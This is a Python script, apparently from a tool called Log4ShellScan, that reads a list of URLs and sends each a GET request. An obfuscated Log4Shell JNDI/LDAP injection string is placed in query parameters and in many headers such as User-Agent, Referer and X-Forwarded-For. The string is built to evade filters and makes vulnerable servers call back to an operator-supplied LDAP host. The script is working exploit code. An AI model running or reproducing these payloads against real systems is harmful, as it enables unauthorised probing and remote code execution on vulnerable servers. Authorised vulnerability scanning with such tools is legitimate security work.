import requests
from colorama import Fore


def open_file(file):
    """
    Receives 1 parameter: a file (mainly .txt).

    Then it opens the file, reads it's lines, returns the lines through the "text" variable, and closes the file automatically.
    """
    with open(file, "r") as f:
        text = f.readlines()
        return text


def send_payload(url, server_string):
    """
    Receives 2 parameters: a url and a server_string that it's going to use to receive the response from the vulnerable website.

    Sets payload, and then it creates dictionaries for both the parameters and headers, using the payload for the value
    of all items in both ("params" and "headers") dictionaries.

    Then it prints the url that it's about to test, and finally it sends a GET request to the corresponding website that received in the "url" parameter.
    """
    payload = f"${{${{env:BARFOO:-j}}ndi${{env:BARFOO:-:}}${{env:BARFOO:-l}}dap${{env:BARFOO:-:}}//{server_string}/a}}"
    params = {"id": payload, "keywords": payload}
    headers = {
        "User-Agent": payload,
        "Referer": payload,
        "CF-Connecting_IP": payload,
        "True-Client-IP": payload,
        "Originating-IP": payload,
        "Forwarded": payload,
        "Client-IP": payload,
        "Contact": payload,
        "From": payload,
        "X-Forwarded-For": payload,
        "X-Wap-Profile": payload,
        "X-Client-IP": payload,
        "X-Real-IP": payload,
    }
    stripped_url = url.strip()
    print(f"{Fore.BLUE}{stripped_url}")
    requests.get(url, headers=headers, params=params, verify=False, timeout=10)


def payload_sender(urls, server_string):
    """
    Receives 2 parameters: an iterable that contains multiple urls (in this case from a file) and a server_string that it's going to use to receive the response from the vulnerable website.

    Then it iterates over the iterable that was provided through the "urls" parameter, and for each item on it, it'll call the "send_payload" with both the item and the "server_string".
    """
    try:
        for url in urls:
            send_payload(url, server_string)
    except:
        pass


def start_message():
    """
    It accepts no parameters, and it just prints the first message that the user sees when they run the script.
    """
    print(f"{Fore.GREEN}**************************")
    print(f"{Fore.GREEN}Initializing Log4ShellScan")
    print(f"{Fore.GREEN}**************************")
    print("\n")
